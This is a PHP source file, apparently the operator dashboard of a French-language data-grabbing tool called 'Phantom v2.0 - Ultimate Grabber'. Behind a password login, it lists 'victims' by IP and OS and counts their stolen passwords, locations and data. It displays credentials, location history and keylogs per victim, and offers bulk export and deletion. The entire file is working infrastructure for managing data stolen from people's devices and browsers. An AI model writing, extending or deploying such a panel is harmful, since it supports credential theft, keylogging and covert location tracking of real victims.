<?php
session_start();
require_once '../config.php';

// Login
if (!isset($_SESSION['admin'])) {
    if (isset($_POST['password']) && password_verify($_POST['password'], ADMIN_PASSWORD)) {
        $_SESSION['admin'] = true;
    } else {
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <title>Phantom Admin</title>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body {
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    font-family: 'Segoe UI', sans-serif;
                    height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    margin: 0;
                }
                .login-box {
                    background: white;
                    padding: 40px;
                    border-radius: 10px;
                    box-shadow: 0 20px 40px rgba(0,0,0,0.1);
                    width: 350px;
                }
                .login-box h1 {
                    text-align: center;
                    margin-bottom: 30px;
                    color: #333;
                }
                .login-box input {
                    width: 100%;
                    padding: 12px;
                    margin-bottom: 20px;
                    border: 1px solid #ddd;
                    border-radius: 5px;
                    box-sizing: border-box;
                }
                .login-box button {
                    width: 100%;
                    padding: 12px;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                    font-size: 16px;
                }
                .login-box button:hover {
                    opacity: 0.9;
                }
            </style>
        </head>
        <body>
            <div class="login-box">
                <h1>PHANTOM</h1>
                <form method="POST">
                    <input type="password" name="password" placeholder="Mot de passe" required>
                    <button type="submit">Accéder</button>
                </form>
            </div>
        </body>
        </html>
        <?php
        exit;
    }
}

// Statistiques
$stats = [
    'total' => $pdo->query("SELECT COUNT(*) FROM victims")->fetchColumn(),
    'today' => $pdo->query("SELECT COUNT(*) FROM victims WHERE DATE(first_seen) = CURDATE()")->fetchColumn(),
    'online' => $pdo->query("SELECT COUNT(*) FROM victims WHERE last_seen > DATE_SUB(NOW(), INTERVAL 1 HOUR)")->fetchColumn(),
    'locations' => $pdo->query("SELECT COUNT(*) FROM locations")->fetchColumn(),
    'credentials' => $pdo->query("SELECT COUNT(*) FROM credentials")->fetchColumn(),
    'data' => $pdo->query("SELECT COUNT(*) FROM data")->fetchColumn()
];

// Récupération des victimes
$victims = $pdo->query("
    SELECT v.*, 
           (SELECT COUNT(*) FROM data WHERE victim_id=v.id) as data_count,
           (SELECT COUNT(*) FROM locations WHERE victim_id=v.id) as location_count,
           (SELECT COUNT(*) FROM credentials WHERE victim_id=v.id) as credentials_count
    FROM victims v
    ORDER BY v.last_seen DESC
    LIMIT 50
")->fetchAll();
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Phantom - Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            background: #f5f7fa;
        }
        
        .dashboard {
            display: flex;
            min-height: 100vh;
        }
        
        /* Sidebar */
        .sidebar {
            width: 280px;
            background: linear-gradient(180deg, #1a1a2e 0%, #16213e 100%);
            color: white;
            padding: 30px 0;
            position: fixed;
            height: 100vh;
            overflow-y: auto;
        }
        
        .logo {
            padding: 0 20px 30px;
            text-align: center;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        
        .logo h1 {
            font-size: 28px;
            font-weight: 800;
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 5px;
        }
        
        .logo p {
            color: #8b8b8b;
            font-size: 12px;
        }
        
        .nav {
            padding: 20px;
        }
        
        .nav-item {
            display: flex;
            align-items: center;
            padding: 12px 20px;
            color: #8b8b8b;
            text-decoration: none;
            border-radius: 10px;
            margin-bottom: 5px;
            transition: all 0.3s;
        }
        
        .nav-item i {
            width: 24px;
            margin-right: 10px;
            font-size: 18px;
        }
        
        .nav-item:hover {
            background: rgba(255,255,255,0.1);
            color: white;
        }
        
        .nav-item.active {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
        }
        
        .nav-item .badge {
            margin-left: auto;
            background: rgba(255,255,255,0.2);
            padding: 2px 8px;
            border-radius: 10px;
            font-size: 11px;
        }
        
        /* Main content */
        .main {
            flex: 1;
            margin-left: 280px;
            padding: 30px;
        }
        
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }
        
        .header h1 {
            font-size: 28px;
            font-weight: 700;
            color: #333;
        }
        
        .header-actions {
            display: flex;
            gap: 15px;
        }
        
        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 8px;
            transition: all 0.3s;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
        }
        
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102,126,234,0.3);
        }
        
        .btn-secondary {
            background: #f0f0f0;
            color: #333;
        }
        
        .btn-secondary:hover {
            background: #e0e0e0;
        }
        
        /* Stats */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: white;
            border-radius: 15px;
            padding: 20px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.05);
            display: flex;
            align-items: center;
            transition: transform 0.3s;
        }
        
        .stat-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }
        
        .stat-icon {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            background: linear-gradient(135deg, #667eea, #764ba2);
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            color: white;
            font-size: 24px;
        }
        
        .stat-content {
            flex: 1;
        }
        
        .stat-value {
            font-size: 28px;
            font-weight: 700;
            color: #333;
            line-height: 1.2;
        }
        
        .stat-label {
            color: #8b8b8b;
            font-size: 14px;
        }
        
        /* Victim table */
        .table-container {
            background: white;
            border-radius: 15px;
            padding: 20px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.05);
        }
        
        .table-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .table-header h3 {
            font-size: 18px;
            font-weight: 600;
            color: #333;
        }
        
        .table-search {
            display: flex;
            gap: 10px;
        }
        
        .table-search input {
            padding: 8px 15px;
            border: 1px solid #ddd;
            border-radius: 8px;
            width: 250px;
        }
        
        .table-responsive {
            overflow-x: auto;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
        }
        
        th {
            text-align: left;
            padding: 15px;
            background: #f8f9fa;
            color: #333;
            font-weight: 600;
            font-size: 14px;
        }
        
        td {
            padding: 15px;
            border-bottom: 1px solid #eee;
            color: #666;
        }
        
        tr:hover {
            background: #f8f9fa;
        }
        
        .badge {
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: 600;
        }
        
        .badge-android {
            background: rgba(0,200,83,0.1);
            color: #00c853;
        }
        
        .badge-ios {
            background: rgba(0,122,255,0.1);
            color: #007aff;
        }
        
        .badge-web {
            background: rgba(255,149,0,0.1);
            color: #ff9500;
        }
        
        .action-buttons {
            display: flex;
            gap: 5px;
        }
        
        .action-btn {
            width: 30px;
            height: 30px;
            border-radius: 5px;
            border: none;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s;
            background: #f0f0f0;
            color: #666;
        }
        
        .action-btn:hover {
            background: #667eea;
            color: white;
        }
        
        .action-btn.delete:hover {
            background: #ff4444;
            color: white;
        }
        
        /* Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }
        
        .modal.active {
            display: flex;
        }
        
        .modal-content {
            background: white;
            border-radius: 15px;
            width: 90%;
            max-width: 800px;
            max-height: 80vh;
            overflow-y: auto;
        }
        
        .modal-header {
            padding: 20px;
            border-bottom: 1px solid #eee;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            background: white;
        }
        
        .modal-header h2 {
            font-size: 18px;
            color: #333;
        }
        
        .modal-close {
            background: none;
            border: none;
            font-size: 20px;
            cursor: pointer;
            color: #999;
        }
        
        .modal-body {
            padding: 20px;
        }
        
        .victim-tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        
        .victim-tab {
            padding: 8px 15px;
            border: none;
            border-radius: 20px;
            background: #f0f0f0;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .victim-tab:hover {
            background: #e0e0e0;
        }
        
        .victim-tab.active {
            background: #667eea;
            color: white;
        }
        
        .data-view {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 10px;
            min-height: 300px;
            font-family: monospace;
            white-space: pre-wrap;
            overflow-x: auto;
        }
    </style>
</head>
<body>
    <div class="dashboard">
        <!-- Sidebar -->
        <aside class="sidebar">
            <div class="logo">
                <h1>PHANTOM</h1>
                <p>v2.0 - Ultimate Grabber</p>
            </div>
            
            <nav class="nav">
                <a href="#" class="nav-item active">
                    <i class="fas fa-tachometer-alt"></i>
                    Dashboard
                    <span class="badge"><?= $stats['total'] ?></span>
                </a>
                <a href="#" class="nav-item">
                    <i class="fas fa-users"></i>
                    Victimes
                </a>
                <a href="#" class="nav-item">
                    <i class="fas fa-map-marker-alt"></i>
                    Localisations
                </a>
                <a href="#" class="nav-item">
                    <i class="fas fa-key"></i>
                    Mots de passe
                </a>
                <a href="#" class="nav-item">
                    <i class="fas fa-cog"></i>
                    Paramètres
                </a>
                <a href="?logout=1" class="nav-item">
                    <i class="fas fa-sign-out-alt"></i>
                    Déconnexion
                </a>
            </nav>
        </aside>
        
        <!-- Main content -->
        <main class="main">
            <header class="header">
                <h1>Dashboard</h1>
                <div class="header-actions">
                    <button class="btn btn-secondary" onclick="location.reload()">
                        <i class="fas fa-sync-alt"></i>
                        Rafraîchir
                    </button>
                    <button class="btn btn-primary" onclick="exportAll()">
                        <i class="fas fa-download"></i>
                        Exporter tout
                    </button>
                </div>
            </header>
            
            <!-- Stats -->
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-icon"><i class="fas fa-users"></i></div>
                    <div class="stat-content">
                        <div class="stat-value"><?= $stats['total'] ?></div>
                        <div class="stat-label">Victimes totales</div>
                    </div>
                </div>
                
                <div class="stat-card">
                    <div class="stat-icon"><i class="fas fa-calendar-day"></i></div>
                    <div class="stat-content">
                        <div class="stat-value"><?= $stats['today'] ?></div>
                        <div class="stat-label">Aujourd'hui</div>
                    </div>
                </div>
                
                <div class="stat-card">
                    <div class="stat-icon"><i class="fas fa-circle"></i></div>
                    <div class="stat-content">
                        <div class="stat-value"><?= $stats['online'] ?></div>
                        <div class="stat-label">En ligne</div>
                    </div>
                </div>
                
                <div class="stat-card">
                    <div class="stat-icon"><i class="fas fa-map-marker-alt"></i></div>
                    <div class="stat-content">
                        <div class="stat-value"><?= $stats['locations'] ?></div>
                        <div class="stat-label">Localisations</div>
                    </div>
                </div>
                
                <div class="stat-card">
                    <div class="stat-icon"><i class="fas fa-key"></i></div>
                    <div class="stat-content">
                        <div class="stat-value"><?= $stats['credentials'] ?></div>
                        <div class="stat-label">Mots de passe</div>
                    </div>
                </div>
                
                <div class="stat-card">
                    <div class="stat-icon"><i class="fas fa-database"></i></div>
                    <div class="stat-content">
                        <div class="stat-value"><?= $stats['data'] ?></div>
                        <div class="stat-label">Données totales</div>
                    </div>
                </div>
            </div>
            
            <!-- Victims table -->
            <div class="table-container">
                <div class="table-header">
                    <h3>Dernières victimes</h3>
                    <div class="table-search">
                        <input type="text" id="searchInput" placeholder="Rechercher...">
                        <button class="btn btn-secondary" onclick="search()">
                            <i class="fas fa-search"></i>
                        </button>
                    </div>
                </div>
                
                <div class="table-responsive">
                    <table id="victimsTable">
                        <thead>
                            <tr>
                                <th>ID</th>
                                <th>IP</th>
                                <th>OS</th>
                                <th>Première vue</th>
                                <th>Dernière vue</th>
                                <th>Données</th>
                                <th>Localisations</th>
                                <th>Mots de passe</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($victims as $v): ?>
                            <tr>
                                <td><code><?= substr($v['id'], 0, 8) ?>...</code></td>
                                <td><?= $v['ip'] ?></td>
                                <td>
                                    <span class="badge badge-<?= strtolower($v['os'] ?? 'web') ?>">
                                        <?= $v['os'] ?? 'Web' ?>
                                    </span>
                                </td>
                                <td><?= date('d/m H:i', strtotime($v['first_seen'])) ?></td>
                                <td><?= time_elapsed_string($v['last_seen']) ?></td>
                                <td><?= $v['data_count'] ?></td>
                                <td><?= $v['location_count'] ?></td>
                                <td><?= $v['credentials_count'] ?></td>
                                <td>
                                    <div class="action-buttons">
                                        <button class="action-btn" onclick="viewVictim('<?= $v['id'] ?>')" title="Voir">
                                            <i class="fas fa-eye"></i>
                                        </button>
                                        <button class="action-btn" onclick="downloadVictim('<?= $v['id'] ?>')" title="Télécharger">
                                            <i class="fas fa-download"></i>
                                        </button>
                                        <button class="action-btn delete" onclick="deleteVictim('<?= $v['id'] ?>')" title="Supprimer">
                                            <i class="fas fa-trash"></i>
                                        </button>
                                    </div>
                                </td>
                            </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
            </div>
        </main>
    </div>
    
    <!-- Victim Modal -->
    <div class="modal" id="victimModal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 id="modalTitle">Détails de la victime</h2>
                <button class="modal-close" onclick="closeModal()">&times;</button>
            </div>
            <div class="modal-body">
                <div class="victim-tabs" id="victimTabs">
                    <button class="victim-tab active" onclick="switchTab('info')">ℹ️ Info</button>
                    <button class="victim-tab" onclick="switchTab('system')">💻 Système</button>
                    <button class="victim-tab" onclick="switchTab('location')">📍 Localisation</button>
                    <button class="victim-tab" onclick="switchTab('credentials')">🔑 Credentials</button>
                    <button class="victim-tab" onclick="switchTab('keylogs')">⌨️ Keylogs</button>
                </div>
                <div class="data-view" id="victimData"></div>
            </div>
        </div>
    </div>
    
    <script>
        let currentVictim = null;
        
        function viewVictim(id) {
            currentVictim = id;
            document.getElementById('modalTitle').innerText = 'Victime: ' + id;
            document.getElementById('victimModal').classList.add('active');
            
            fetch('/api/victim.php?id=' + id)
                .then(r => r.json())
                .then(data => {
                    document.getElementById('victimData').innerText = JSON.stringify(data, null, 2);
                });
        }
        
        function closeModal() {
            document.getElementById('victimModal').classList.remove('active');
        }
        
        function switchTab(tab) {
            document.querySelectorAll('.victim-tab').forEach(t => t.classList.remove('active'));
            event.target.classList.add('active');
            
            if (!currentVictim) return;
            
            fetch('/api/victim.php?id=' + currentVictim)
                .then(r => r.json())
                .then(data => {
                    if (tab === 'info') {
                        document.getElementById('victimData').innerText = JSON.stringify({
                            id: data.id,
                            ip: data.ip,
                            os: data.os,
                            first_seen: data.first_seen,
                            last_seen: data.last_seen
                        }, null, 2);
                    } else if (tab === 'system') {
                        const systemData = data.data?.find(d => d.type === 'system');
                        document.getElementById('victimData').innerText = JSON.stringify(systemData, null, 2);
                    } else if (tab === 'location') {
                        document.getElementById('victimData').innerText = JSON.stringify(data.locations, null, 2);
                    } else if (tab === 'credentials') {
                        document.getElementById('victimData').innerText = JSON.stringify(data.credentials, null, 2);
                    } else if (tab === 'keylogs') {
                        const keylogs = data.data?.filter(d => d.type === 'keylog');
                        document.getElementById('victimData').innerText = JSON.stringify(keylogs, null, 2);
                    }
                });
        }
        
        function downloadVictim(id) {
            window.location.href = '/api/download.php?id=' + id + '&format=json';
        }
        
        function deleteVictim(id) {
            if (confirm('Supprimer cette victime ?')) {
                fetch('/api/delete.php?id=' + id, { method: 'DELETE' })
                    .then(() => location.reload());
            }
        }
        
        function exportAll() {
            window.location.href = '/api/download.php?all=1';
        }
        
        function search() {
            const term = document.getElementById('searchInput').value.toLowerCase();
            const rows = document.querySelectorAll('#victimsTable tbody tr');
            
            rows.forEach(row => {
                const text = row.innerText.toLowerCase();
                row.style.display = text.includes(term) ? '' : 'none';
            });
        }
        
        // Refresh toutes les 30 secondes
        setInterval(() => {
            location.reload();
        }, 30000);
    </script>
</body>
</html>
<?php
function time_elapsed_string($datetime) {
    $now = new DateTime;
    $ago = new DateTime($datetime);
    $diff = $now->diff($ago);
    
    if ($diff->y > 0) return $diff->y . ' an' . ($diff->y > 1 ? 's' : '');
    if ($diff->m > 0) return $diff->m . ' mois';
    if ($diff->d > 0) return $diff->d . ' jour' . ($diff->d > 1 ? 's' : '');
    if ($diff->h > 0) return $diff->h . ' h';
    if ($diff->i > 0) return $diff->i . ' min';
    return 'maintenant';
}
?>
